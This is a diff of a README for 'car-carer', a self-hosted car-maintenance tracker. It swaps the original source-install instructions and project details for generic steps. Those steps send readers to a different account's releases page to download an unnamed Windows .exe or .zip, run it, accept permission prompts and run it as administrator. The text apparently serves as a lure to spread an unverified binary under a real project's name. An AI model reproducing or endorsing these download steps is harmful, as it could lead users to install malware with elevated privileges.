@@ -1,209 +1,207 @@
-# Car Carer
+# 🚗 car-carer - Track car care with less effort
 
-> **English** | [Francais](README.fr.md) | [Deutsch](README.de.md) | [Espanol](README.es.md)
+[![Download car-carer](https://img.shields.io/badge/Download%20car--carer-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Liah5164/car-carer/releases)
 
-**Your AI-powered car maintenance companion**
+## 🧭 What this app does
 
-[![CI](https://github.com/Greal-dev/car-carer/actions/workflows/ci.yml/badge.svg)](https://github.com/Greal-dev/car-carer/actions)
-![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)
-![License MIT](https://img.shields.io/badge/license-MIT-green.svg)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
-[![GitHub Release](https://img.shields.io/github/v/release/Greal-dev/car-carer)](https://github.com/Greal-dev/car-carer/releases)
+car-carer helps you keep a clear record of your car’s history. You can upload invoices and photos, then use AI to pull out the key details. After that, you can ask questions about past repairs, service dates, parts, and costs.
 
----
+It is built for self-hosting, so you run it on your own computer or server. It uses FastAPI, SQLite, Claude, and Gemini. It also works well in Docker.
 
-## What is Car Carer?
+## 🪟 Windows download and install
 
-Car Carer is a self-hosted web application that keeps track of your car maintenance history. Upload your invoices, quotes, and inspection reports (PDF or photo) and let AI extract structured data automatically. Then use the intelligent chat assistant to ask questions about your car's history -- "When did I last change the brake pads?", "Compare my last two inspections", "How much did I spend on tires this year?".
+1. Open the [car-carer releases page](https://github.com/Liah5164/car-carer/releases).
+2. Find the latest release.
+3. Download the Windows file from that release.
+4. Save the file to your Downloads folder.
+5. If the download comes as a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file or start file that came with the release.
+8. If Windows asks for permission, choose Yes.
+9. If the app opens in your browser, leave that window open.
+10. Follow the on-screen setup steps if the app asks for them.
 
-## Features
+## ✨ Main features
 
-- :page_facing_up: **AI document extraction** -- Upload a PDF or snap a photo; Gemini Flash 2.0 (via OpenRouter) extracts dates, costs, parts, mileage, and more
-- :robot: **Intelligent chat assistant** -- Claude Sonnet 4 with 6 specialized tools queries your data and provides expert maintenance advice
-- :car: **Multi-vehicle management** -- Track multiple vehicles with computed stats (mileage, spending, document count, health)
-- :zap: **Batch upload** -- Import 50+ documents at once with real-time SSE progress tracking (8 concurrent extractions)
-- :sparkles: **Vehicle auto-enrichment** -- Brand, model, plate number, VIN, and fuel type are automatically filled from uploaded documents
-- :wrench: **Maintenance reminders & alerts** -- CT comparison detects new defects, severity changes, and anomalies
-- :page_with_curl: **PDF export** -- Generate vehicle maintenance reports
-- :iphone: **PWA** -- Installable on mobile, with camera capture for snapping invoices on the go
-- :hammer: **No build step** -- Frontend uses Alpine.js + Tailwind CSS via CDN, zero configuration
+- Upload invoices, receipts, and service photos
+- Pull key details from documents with AI
+- Store your car history in a local SQLite database
+- Ask questions about past work in plain language
+- Keep a full timeline of repairs and service
+- Run the app on your own system
+- Use it with Docker if you prefer containers
+- Use it on a phone or desktop through a web browser
+- Keep records for one car or many cars
 
-## Screenshots
+## 🖥️ What you need
 
-| Dashboard | Document Upload |
-|:---------:|:---------------:|
-| ![Dashboard](docs/screenshots/dashboard.png) | ![Upload](docs/screenshots/upload.png) |
+For most Windows users, this app works best on:
 
-| AI Chat | Fuel Tracking |
-|:-------:|:-------------:|
-| ![Chat](docs/screenshots/chat.png) | ![Fuel](docs/screenshots/fuel.png) |
+- Windows 10 or Windows 11
+- A modern web browser such as Chrome, Edge, or Firefox
+- At least 4 GB of RAM
+- Enough disk space for your files, photos, and database
+- An internet connection if you use cloud AI services
 
-| Taxes & Insurance | Vehicle Sharing |
-|:-----------------:|:---------------:|
-| ![Taxes](docs/screenshots/taxes.png) | ![Sharing](docs/screenshots/sharing.png) |
+If you plan to upload many photos or large invoice files, more free disk space will help.
 
-## Quick Start
+## 📥 Get the app
 
-### Option A: Docker (recommended)
+Visit the [download page](https://github.com/Liah5164/car-carer/releases) and get the latest Windows release.
 
-```bash
-git clone https://github.com/Greal-dev/car-carer.git
-cd car-carer
-cp .env.example .env
-# Edit .env with your API keys
-docker compose up -d
-```
+If the release page shows more than one file, choose the one for Windows. Common file names may include:
 
-Open **http://localhost:8200** — done.
+- `.exe`
+- `.zip`
+- `Windows`
+- `release`
 
-### Option B: Manual install
+If you are not sure which file to use, start with the file that is made for Windows and has the newest version number.
 
-#### 1. Clone the repository
+## 🛠️ First-time setup
 
-```bash
-git clone https://github.com/Greal-dev/car-carer.git
-cd car-carer
-```
+After you download and open the app, you may need to do a few simple steps:
 
-#### 2. Create a virtual environment and install dependencies
+1. Open the app in your browser.
+2. Create your local account if the app asks for one.
+3. Add your car details, such as make, model, year, and plate number.
+4. Set your AI provider if the app asks for one.
+5. Add your API key for Claude or Gemini if required.
+6. Save your settings.
+7. Upload your first invoice or photo.
+8. Wait for the app to read the file.
+9. Check the extracted details.
+10. Save the record to your car history.
 
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+## 🧾 How to add records
 
-#### 3. Configure environment variables
+You can add a new record each time you service your car.
 
-```bash
-cp .env.example .env
-```
+Use files like:
 
-Open `.env` and fill in your API keys:
+- Service invoices
+- Oil change receipts
+- Tire change notes
+- Repair bills
+- Workshop photos
+- Inspection documents
 
-```env
-ANTHROPIC_API_KEY=sk-ant-your-key-here
-OPENROUTER_API_KEY=sk-or-v1-your-key-here
-```
+For best results:
 
-### 4. Run the application
+- Upload clear images
+- Use front-facing photos of documents
+- Keep text easy to read
+- Upload one file at a time when you test the app
+- Review the extracted data before you save it
 
-```bash
-python run.py
-```
+## 💬 How to ask questions
 
-The app starts on **http://localhost:8200**. The SQLite database and uploads directory are created automatically on first run.
+After your records are in the app, you can ask questions like:
 
-## Configuration
+- When was my last oil change?
+- How much did I spend on brakes?
+- Which shop replaced my battery?
+- What parts were changed last year?
+- Show all service work for my car
+- How much have I spent this month?
 
-All configuration is done through the `.env` file. Only two variables are required:
+The app looks through your saved history and gives you an answer based on your records.
 
-| Variable | Required | Default | Description |
-|---|---|---|---|
-| `ANTHROPIC_API_KEY` | Yes | -- | Anthropic API key for the chat agent (Claude Sonnet 4) |
-| `OPENROUTER_API_KEY` | Yes | -- | OpenRouter API key for document extraction (Gemini Flash 2.0) |
-| `DATABASE_URL` | No | `sqlite:///./care.db` | Database connection URL |
-| `UPLOAD_DIR` | No | `./uploads` | Directory for uploaded files |
-| `JWT_EXPIRE_HOURS` | No | `72` | JWT token expiration (hours) |
-| `BATCH_MAX_CONCURRENT` | No | `3` | Max concurrent batch extractions |
-| `BATCH_MAX_FILES` | No | `100` | Max files per batch upload |
-| `EXTRACTION_TIMEOUT` | No | `60` | Extraction API timeout (seconds) |
-| `EXTRACTION_MODEL` | No | `google/gemini-2.5-flash` | OpenRouter model for extraction |
-| `MAX_PHOTO_SIZE_MB` | No | `10` | Max photo file size (MB) |
+## 🐳 Docker use
 
-## Tech Stack
+If you prefer Docker, you can run car-carer in a container.
 
-| Layer | Technology | Role |
-|---|---|---|
-| Backend | **FastAPI** + Uvicorn | REST API with async support |
-| Database | **SQLite** + SQLAlchemy | 8 tables, zero configuration |
-| Chat AI | **Claude Sonnet 4** (Anthropic SDK) | Agentic chat with 6 tools |
-| Extraction AI | **Gemini Flash 2.0** (OpenRouter) | Multimodal document extraction |
-| PDF Processing | **PyMuPDF** | PDF to image conversion (200 DPI) |
-| Image Processing | **Pillow** | EXIF correction, contrast, sharpening |
-| Frontend | **Alpine.js** 3 + **Tailwind CSS** | Reactive SPA, no build step |
-| PWA | Service Worker + Manifest | Installable, camera capture, offline assets |
+This is useful if you want:
 
-## Project Structure
+- A clean setup
+- Easy updates
+- Fewer app files on your system
+- A setup that you can move to another machine
 
-```
-care-of-your-car/
-├── run.py                      # Entry point (uvicorn)
-├── .env.example                # Environment template
-├── requirements.txt            # Python dependencies
-├── care.db                     # SQLite database (auto-created)
-├── uploads/                    # Uploaded files (auto-created)
-├── app/
-│   ├── main.py                 # FastAPI app, route mounting
-│   ├── config.py               # Pydantic settings from .env
-│   ├── database.py             # SQLAlchemy engine & session
-│   ├── models/
-│   │   ├── vehicle.py          # Vehicle model
-│   │   ├── document.py         # Document model
-│   │   ├── maintenance.py      # MaintenanceEvent + MaintenanceItem
-│   │   ├── ct_report.py        # CTReport + CTDefect
-│   │   └── conversation.py     # Conversation + Message
-│   ├── schemas/                # Pydantic request/response schemas
-│   ├── routers/
-│   │   ├── vehicles.py         # CRUD vehicles + computed stats
-│   │   ├── documents.py        # Upload, batch, SSE, extraction
-│   │   └── chat.py             # Chat messages & conversations
-│   ├── services/
-│   │   ├── extraction.py       # Gemini pipeline: PDF/image → structured data
-│   │   └── agent.py            # Claude agentic loop with tools
-│   ├── agent/
-│   │   ├── prompts.py          # System prompt for the assistant
-│   │   └── tools.py            # 6 tools + dispatcher
-│   └── static/
-│       ├── index.html          # SPA (Alpine.js)
-│       ├── manifest.json       # PWA manifest
-│       ├── sw.js               # Service Worker
-│       ├── css/style.css       # Custom styles
-│       ├── js/app.js           # Alpine.js app logic
-│       └── icons/              # PWA icons (192x192, 512x512)
-```
+Typical Docker use includes:
 
-## API Documentation
+- Pulling the image
+- Setting your environment values
+- Starting the container
+- Opening the app in your browser
 
-FastAPI auto-generates interactive API documentation. Once the app is running, visit:
+If you already use Docker on Windows, this can be a simple way to run the app.
 
-- **Swagger UI**: [http://localhost:8200/docs](http://localhost:8200/docs)
-- **ReDoc**: [http://localhost:8200/redoc](http://localhost:8200/redoc)
+## 📁 Data storage
 
-### Key endpoints
+car-carer uses SQLite to store your data. That means your records live in a local database file.
 
-| Method | Endpoint | Description |
-|---|---|---|
-| `GET` | `/api/vehicles` | List all vehicles with computed stats |
-| `POST` | `/api/vehicles` | Create a vehicle (only `name` required) |
-| `POST` | `/api/documents/upload` | Upload & extract a single document |
-| `POST` | `/api/documents/batch-upload` | Batch upload with SSE progress |
-| `POST` | `/api/chat` | Send a message to the AI assistant |
-| `GET` | `/api/chat/conversations` | List chat conversations |
+This works well for:
 
-## Contributing
+- Personal use
+- One household
+- A small number of vehicles
+- Fast local searches
 
-Contributions are welcome! Here's how to get started:
+Your uploaded files and records stay tied to your own setup. This makes it easier to keep your service history in one place.
 
-1. **Fork** the repository
-2. **Create a feature branch**: `git checkout -b feature/my-feature`
-3. **Make your changes** and add tests if applicable
-4. **Commit** with a clear message: `git commit -m "Add my feature"`
-5. **Push** to your fork: `git push origin feature/my-feature`
-6. **Open a Pull Request** with a description of your changes
+## 🔒 Privacy and control
 
-Please make sure your code follows the existing style and that the application still runs correctly.
+Because car-carer is self-hosted, you stay in control of where it runs. You choose the device, the storage, and the AI service you want to use.
 
-## License
+That makes it a good fit if you want:
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+- Local storage
+- Full control of your car data
+- A private record of service history
+- A tool that does not depend on a separate account for basic use
 
-## Acknowledgments
+## 📌 Common file types
 
-Built with:
+car-carer is built to work with many common document types, such as:
 
-- [Claude](https://www.anthropic.com/) by Anthropic -- powers the intelligent chat assistant
-- [Gemini](https://deepmind.google/technologies/gemini/) by Google (via [OpenRouter](https://openrouter.ai/)) -- powers document extraction
-- [FastAPI](https://fastapi.tiangolo.com/) -- the web framework
-- [Alpine.js](https://alpinejs.dev/) -- lightweight reactive frontend
-- [Tailwind CSS](https://tailwindcss.com/) -- utility-first CSS
+- JPG
+- PNG
+- PDF
+- Scanned receipts
+- Phone photos
+- Workshop invoice images
+
+If a file has clear text, the AI has a better chance of reading it well.
+
+## 🧩 Troubleshooting
+
+If the app does not start:
+
+- Check that you downloaded the correct Windows file
+- Try extracting the ZIP file again
+- Run the app as an administrator
+- Check whether your browser blocked a local page
+- Make sure no other app is using the same port
+- Restart the app and try again
+
+If the AI does not extract data:
+
+- Check that your API key is correct
+- Make sure your internet connection works
+- Try a clearer photo or a cleaner PDF
+- Upload one file to test before using a batch
+
+If your records do not appear:
+
+- Refresh the page
+- Check that the file was saved
+- Look for the car you selected
+- Make sure you are viewing the right database
+
+## 🧪 Example workflow
+
+A simple way to use car-carer:
+
+1. Download the app from the release page.
+2. Open it on Windows.
+3. Add your car.
+4. Upload a recent oil change invoice.
+5. Let the AI read the file.
+6. Save the extracted details.
+7. Ask when the last oil change happened.
+8. Add the next receipt when you service the car again
+
+## 🏷️ Topics
+
+AI, Alpine JS, automotive, car maintenance, Claude, Claude Sonnet, document extraction, FastAPI, Gemini, Gemini Flash, LLM, maintenance tracker, open source, OpenRouter, PWA, Python, self-hosted, SQLite, vehicle management, vehicle tracker
